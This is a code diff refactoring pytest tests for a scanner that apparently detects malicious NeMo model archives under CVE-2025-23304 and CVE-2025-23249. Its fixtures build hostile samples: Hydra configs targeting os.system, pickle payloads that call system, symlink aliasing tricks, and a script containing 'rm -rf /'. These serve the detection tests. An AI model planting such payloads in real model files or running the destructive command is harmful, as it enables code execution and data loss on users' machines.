-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_link(archive, "alias-1", ".", tarfile.SYMTYPE)
             _add_tar_link(archive, "alias-2", "alias-1", tarfile.SYMTYPE)
             _add_tar_bytes(archive, "alias-2/payload.bin", b"safe\n")
@@ -3471,8 +3272,7 @@ class TestCVE202523304HydraTarget:
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
         path = tmp_path / "component-prefix-resolution-budget.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_link(archive, "alias", ".", tarfile.SYMTYPE)
             _add_tar_bytes(archive, "one/two/three/four/payload.bin", b"safe\n")
 
@@ -3512,36 +3312,20 @@ class TestCVE202523304HydraTarget:
         with tarfile.open(path, "w") as archive:
             _add_tar_bytes(archive, payload_name, b"model: safe\n")
             _add_tar_bytes(archive, payload_name, b"model:\n  _target_: os.system\n  command: echo pwned\n")
-            link_info = tarfile.TarInfo(config_name)
-            link_info.type = tarfile.SYMTYPE
-            link_info.linkname = "payload.txt"
-            archive.addfile(link_info)
+            _add_tar_link(archive, config_name, link_type=tarfile.SYMTYPE, target="payload.txt")
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_scans_duplicate_root_config_replacement(self, tmp_path: Path) -> None:
         path = tmp_path / "duplicate-root-config.jpg"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_renamed_nemo_root_config_within_route_budget_is_scanned(
         self,
@@ -3801,8 +3585,7 @@ class TestCVE202523304HydraTarget:
             _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
         path = tmp_path / "referenced-container.jpg"
         config = {"model": {"_target_": "nemo.Model"}, "artifact": "nemo:assets/payload.tar.gz"}
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(path, yaml.safe_dump(config).encode()) as archive:
             archive.add(nested_path, arcname="assets/payload.tar.gz")
 
         result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 100})
@@ -3843,8 +3626,7 @@ class TestCVE202523304HydraTarget:
             _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n")
         path = tmp_path / "referenced-malicious-container.jpg"
         config = {"model": {"_target_": "os.system"}, "artifact": "nemo:assets/payload.tar.gz"}
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(path, yaml.safe_dump(config).encode()) as archive:
             archive.add(nested_path, arcname="assets/payload.tar.gz")
 
         result = scan_model_directory_or_file(
@@ -4136,8 +3918,7 @@ class TestCVE202523304HydraTarget:
     def test_referenced_joblib_operational_failure_is_not_hidden_by_nemo_composition(self, tmp_path: Path) -> None:
         path = tmp_path / "referenced-joblib-container.jpg"
         config = {"model": {"_target_": "nemo.Model"}, "artifact": "nemo:assets/payload.joblib"}
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(path, yaml.safe_dump(config).encode()) as archive:
             _add_tar_bytes(archive, "assets/payload.joblib", b"not a pickle")
 
         result = scan_file(str(path), config={"cache_scan_results": False})
@@ -6986,12 +6767,8 @@ class TestCVE202523304HydraTarget:
         malformed_config = b"model: [unterminated\n"
         script = b"#!/bin/sh\nid\n"
         with tarfile.open(nemo_path, "w") as tar:
-            info = tarfile.TarInfo(name="model_config.yaml")
-            info.size = len(malformed_config)
-            tar.addfile(info, io.BytesIO(malformed_config))
-            info = tarfile.TarInfo(name="payload.sh")
-            info.size = len(script)
-            tar.addfile(info, io.BytesIO(script))
+            _add_tar_bytes(tar, "model_config.yaml", malformed_config)
+            _add_tar_bytes(tar, "payload.sh", script)
 
         result = scan_model_directory_or_file(
             str(nemo_path),
@@ -7213,14 +6990,10 @@ class TestCVE202523304HydraTarget:
         with tarfile.open(nemo_path, "w") as tar:
             # Add a config
             config_bytes = yaml.dump({"model": {"_target_": "nemo.Model"}}).encode()
-            info = tarfile.TarInfo(name="config.yaml")
-            info.size = len(config_bytes)
-            tar.addfile(info, io.BytesIO(config_bytes))
+            _add_tar_bytes(tar, "config.yaml", config_bytes)
             # Add suspicious script
             script = b"#!/bin/bash\nrm -rf /"
-            info = tarfile.TarInfo(name="exploit.sh")
-            info.size = len(script)
-            tar.addfile(info, io.BytesIO(script))
+            _add_tar_bytes(tar, "exploit.sh", script)
 
         result = NemoScanner().scan(str(nemo_path))
 
@@ -7246,9 +7019,7 @@ class TestCVE202523304HydraTarget:
         nemo_path = tmp_path / "model.nemo"
         with tarfile.open(nemo_path, "w") as tar:
             data = b"binary weights data"
-            info = tarfile.TarInfo(name="weights.bin")
-            info.size = len(data)
-            tar.addfile(info, io.BytesIO(data))
+            _add_tar_bytes(tar, "weights.bin", data)
 
         direct_result = NemoScanner().scan(str(nemo_path))
         aggregate_result = scan_model_directory_or_file(
@@ -7326,8 +7097,7 @@ class TestCVE202523304HydraTarget:
     ) -> None:
         nemo_path = tmp_path / f"over-budget-{target.replace('.', '-')}.tar.gz"
         config_payload = f"model:\n  _target_: {target}\n".encode()
-        with tarfile.open(nemo_path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", config_payload)
+        with _open_nemo_with_root_config(nemo_path, config_payload, mode="w:gz") as archive:
             _add_tar_bytes(archive, "weights.ckpt", b"x" * 128)
 
         def fail_checkpoint_extraction(*_args: Any, **_kwargs: Any) -> None:
@@ -7413,8 +7183,7 @@ class TestCVE202523304HydraTarget:
     ) -> None:
         nemo_path = tmp_path / f"terminal-{boundary}.nemo"
         mode: _NemoTarWriteMode = "w" if boundary == "entry_count" else "w:gz"
-        with tarfile.open(nemo_path, mode) as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n")
+        with _open_nemo_with_root_config(nemo_path, b"model:\n  _target_: os.system\n", mode=mode) as archive:
             _add_tar_bytes(archive, "later.bin", b"x" * (20 * 1024))
 
         config = (
@@ -7448,8 +7217,7 @@ class TestCVE202523304HydraTarget:
         expected_exit_code: int,
     ) -> None:
         nemo_path = tmp_path / f"entry-prefix-{target.replace('.', '-')}.nemo"
-        with tarfile.open(nemo_path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", f"model:\n  _target_: {target}\n".encode())
+        with _open_nemo_with_root_config(nemo_path, f"model:\n  _target_: {target}\n".encode(), mode="w:gz") as archive:
             _add_tar_bytes(archive, "safe.bin", b"safe")
             _add_tar_bytes(archive, "late.pkl", b'cos\nsystem\n(S"echo late"\ntR.')
 
@@ -7601,8 +7369,7 @@ class TestCVE202523304HydraTarget:
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
         model_path = tmp_path / "replace-before-tar-followup.tar.gz"
-        with tarfile.open(model_path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: torch.nn.Linear\n")
+        with _open_nemo_with_root_config(model_path, b"model:\n  _target_: torch.nn.Linear\n", mode="w:gz") as archive:
             _add_tar_bytes(archive, "payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
         replacement_path = tmp_path / "replacement.tar.gz"
         with tarfile.open(replacement_path, "w:gz") as archive:
@@ -7655,8 +7422,7 @@ class TestCVE202523304HydraTarget:
         mutation: Literal["truncate", "unlink"],
     ) -> None:
         model_path = tmp_path / f"mutated-before-tar-followup-{mutation}.tar.gz"
-        with tarfile.open(model_path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n")
+        with _open_nemo_with_root_config(model_path, b"model:\n  _target_: os.system\n", mode="w:gz") as archive:
             _add_tar_bytes(archive, "payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
 
         original_nemo_scan = NemoScanner._scan_nemo_archive
@@ -7810,8 +7576,7 @@ class TestCVE202523304HydraTarget:
         nemo_path = tmp_path / "within-budget.tar.gz"
         config_payload = b"model:\n  _target_: torch.nn.Linear\n"
         weights_payload = b"safe weights"
-        with tarfile.open(nemo_path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", config_payload)
+        with _open_nemo_with_root_config(nemo_path, config_payload, mode="w:gz") as archive:
             _add_tar_bytes(archive, "weights.bin", weights_payload)
 
         initial_consumed = 32
@@ -7970,8 +7735,7 @@ class TestCVE202523304HydraTarget:
         config_payload = b"artifacts:\n" + b"".join(
             f"  item_{index}: nemo:artifacts/{index}.bin\n".encode() for index in range(3)
         )
-        with tarfile.open(nemo_path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", config_payload)
+        with _open_nemo_with_root_config(nemo_path, config_payload) as archive:
             for index in range(3):
                 _add_tar_bytes(archive, f"artifacts/{index}.bin", nested_payload)
 
@@ -8105,6 +7869,22 @@ def _assert_hydra_target_critical_without_review(tmp_path: Path, target: str) ->
     )
 
 
+def _assert_nemo_reports_os_system_target(result: ScanResult) -> None:
+    assert result.scanner_name == "nemo"
+    assert any(
+        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+        and check.status == CheckStatus.FAILED
+        and check.details["target"] == "os.system"
+        for check in result.checks
+    )
+
+
+def _assert_unsupported_link_without_cve_2025_23249(result: ScanResult) -> None:
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
+    assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+
+
 def _assert_nemo_root_config_scan(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch, entry_limit: int, filename: str
 ) -> None:
@@ -8117,20 +7897,13 @@ def _assert_nemo_root_config_scan(
 
     result = scan_file(str(path), config={"cache_scan_results": False})
 
-    assert result.scanner_name == "nemo"
-    assert any(
-        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-        and check.status == CheckStatus.FAILED
-        and check.details["target"] == "os.system"
-        for check in result.checks
-    )
+    _assert_nemo_reports_os_system_target(result)
 
 
 def _assert_nemo_torch7_checkpoint_cve(tmp_path: Path, filename: str, payload: bytes) -> None:
     nemo_path = tmp_path / filename
     torch7_payload = payload
-    with tarfile.open(nemo_path, "w") as tar:
-        _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+    with _open_nemo_with_root_config(nemo_path) as tar:
         _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
 
     result = NemoScanner().scan(str(nemo_path))
@@ -8150,13 +7923,7 @@ def _assert_core_routes_renamed_nemo(
 
     result = scan_file(str(path), config={"cache_scan_results": False})
 
-    assert result.scanner_name == "nemo"
-    assert any(
-        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-        and check.status == CheckStatus.FAILED
-        and check.details["target"] == "os.system"
-        for check in result.checks
-    )
+    _assert_nemo_reports_os_system_target(result)
 
 
 def _assert_nemo_suspicious_target(tmp_path: Path, target: str, pattern: str) -> None:
